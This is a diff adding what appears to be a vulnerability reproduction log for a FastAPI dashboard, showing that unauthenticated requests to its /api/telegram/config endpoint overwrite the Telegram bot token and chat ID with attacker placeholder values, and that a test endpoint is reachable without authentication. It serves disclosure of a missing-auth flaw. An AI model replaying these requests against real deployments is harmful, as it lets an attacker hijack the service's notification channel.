@@ -1,0 +1,13 @@
+Environment: macOS Darwin 25.3.0, Python3 with FastAPI/uvicorn  
+Server started with: OSTWIN_API_KEY=test_key_12345 uvicorn dashboard.api:app --host 127.0.0.1 --port 19022
+Commit: 4c06f66 (HEAD of main)
+
+Test 1: POST /api/telegram/config with body {"bot_token":"ATTACKER_TOKEN_123","chat_id":"ATTACKER_CHAT_456"}
+Result: HTTP 200, body: {"status":"success"}
+
+Test 2: GET /api/telegram/config to verify persistence
+Result: HTTP 200, body: {"bot_token":"ATTACKER_TOKEN_123","chat_id":"ATTACKER_CHAT_456"}
+Config successfully overwritten by unauthenticated request.
+
+Test 3: POST /api/telegram/test (unauthenticated)
+Result: HTTP 500 (expected - attacker token is not a real Telegram token, but the endpoint was reached without auth)
